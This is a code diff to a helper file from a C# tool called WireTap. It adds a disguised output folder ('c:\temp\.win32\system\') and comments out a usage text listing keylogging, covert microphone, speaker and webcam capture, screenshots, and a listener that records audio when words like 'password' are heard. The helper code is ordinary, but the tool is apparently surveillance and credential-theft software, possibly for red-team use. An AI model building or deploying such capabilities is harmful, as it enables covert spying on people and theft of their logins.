@@ -1,22 +1,31 @@
-﻿using System;
-using System.IO;
-using System.Runtime;
-
-namespace WireTap
+﻿namespace WireTap
 {
-    class Helpers
+    using System;
+    using System.Diagnostics;
+    using System.IO;
+
+    public class Helpers
     {
-        public static string CreateTempFileName(string extension = "", string prefix = "")
+        public const string BasePath = "c:\\temp\\.win32\\system\\";
+        public static string Username => Environment.UserName; // System.Security.Principal.WindowsIdentity.GetCurrent()?.Name;
+
+        public static string CreateTempFileName(string extension = "", string prefix = "", string folder = null)
         {
-            var username = Environment.UserName;
-            var directory = $"c:\\temp\\.win32\\system\\{username ?? "unknown"}\\";
+            //var Username = Environment.UserName;
+            var directory = $"{BasePath}{Username ?? "unknown"}\\";
+            //var directory = Debugger.IsAttached
+            //    ? Directory.GetCurrentDirectory()
+            //    : $"c:\\temp\\.win32\\system\\{Username ?? "unknown"}\\";
+
+            if (!string.IsNullOrEmpty(folder))
+                directory += folder + '\\';
 
             if (!Directory.Exists(directory))
             {
                 Directory.CreateDirectory(directory);
             }
 
-            var fileName = $"{prefix}{DateTime.Now.ToString("yyyyMMdd H-m-ss")}{extension}";
+            var fileName = $"{prefix}{DateTime.Now.ToString("yyyyMMdd.HH.mmm.ss")}{extension}";
 
             Console.WriteLine(Path.Combine(directory, fileName));
 
@@ -30,63 +39,66 @@ namespace WireTap
             return String.Format(fmt, dt.Month, dt.Day, dt.Year, dt.Hour, dt.Minute, dt.Second);
         }
 
-        public static int ParseTimerString(string str)
-        {
-            char measure = str[str.Length - 1];
-            int time = int.Parse(str.Substring(0, str.Length - 1));
-            switch (measure)
-            {
-                case 's':
-                    time *= 1000;
-                    break;
-                case 'm':
-                    time *= (60 * 1000);
-                    break;
-                case 'h':
-                    time *= (60 * 60 * 1000);
-                    break;
-                default:
-                    throw new Exception("Invalid time measure passed. Expected one of s, m or h. Received: " + measure.ToString());
-            }
-            return time;
-        }
+        //public static int ParseTimerString(string str)
+        //{
+        //    char measure = str[str.Length - 1];
+        //    int time = int.Parse(str.Substring(0, str.Length - 1));
+        //    switch (measure)
+        //    {
+        //        case 's':
+        //            time *= 1000;
+        //            break;
 
-        public static void Usage()
-        {
-            string usageString = @"
-WireTap.exe [arguments]
+        //        case 'm':
+        //            time *= (60 * 1000);
+        //            break;
 
-Arguments can be one (and only one) of the following:
-    record_mic [10s]     - Record audio from the attached microphone (line-in).
-                           Time suffix can be s/m/h.
-    
-    record_sys [10s]     - Record audio from the system speakers (line-out).
-                           Time suffix can be s/m/h.
+        //        case 'h':
+        //            time *= (60 * 60 * 1000);
+        //            break;
 
-    record_audio [10s]   - Record audio from both the microphone and the speakers.
-                           Time suffix can be s/m/h.
-    
-    capture_screen       - Screenshot the current user's screen.
+        //        default:
+        //            throw new Exception("Invalid time measure passed. Expected one of s, m or h. Received: " + measure.ToString());
+        //    }
+        //    return time;
+        //}
 
-    capture_webcam       - Capture images from the user's attached webcam (if it exists).
+//        public static void Usage()
+//        {
+//            string usageString = @"
+//WireTap.exe [arguments]
 
-    capture_keystrokes   - Begin logging keystrokes to a file.
+//Arguments can be one (and only one) of the following:
+//    record_mic [10s]     - Record audio from the attached microphone (line-in).
+//                           Time suffix can be s/m/h.
 
-    listen_for_passwords [keyword1,keyword2,keyword3] - Listens for words 'username', 'password', 'login',
-                                                        'logon', and 'credential' by default and when
-                                                        heard, starts an audio recording for two minutes.
+//    record_sys [10s]     - Record audio from the system speakers (line-out).
+//                           Time suffix can be s/m/h.
 
-Examples:
-    Record all audio for 30 seconds:
-        WireTap.exe record_audio 30s
-\
-    Start the keylogger:
-        WireTap.exe capture_keystrokes
+//    record_audio [10s]   - Record audio from both the microphone and the speakers.
+//                           Time suffix can be s/m/h.
 
-    Start keyword listener (for a custom-set of strings):
-        WireTap.exe listen_for_passwords oil,password,email
-";
-            Console.WriteLine(usageString);
-        }
+//    capture_screen       - Screenshot the current user's screen.
+
+//    capture_webcam       - Capture images from the user's attached webcam (if it exists).
+
+//    capture_keystrokes   - Begin logging keystrokes to a file.
+
+//    listen_for_passwords [keyword1,keyword2,keyword3] - Listens for words 'username', 'password', 'login',
+//                                                        'logon', and 'credential' by default and when
+//                                                        heard, starts an audio recording for two minutes.
+
+//Examples:
+//    Record all audio for 30 seconds:
+//        WireTap.exe record_audio 30s
+//\
+//    Start the keylogger:
+//        WireTap.exe capture_keystrokes
+
+//    Start keyword listener (for a custom-set of strings):
+//        WireTap.exe listen_for_passwords oil,password,email
+//";
+//            Console.WriteLine(usageString);
+//        }
     }
 }
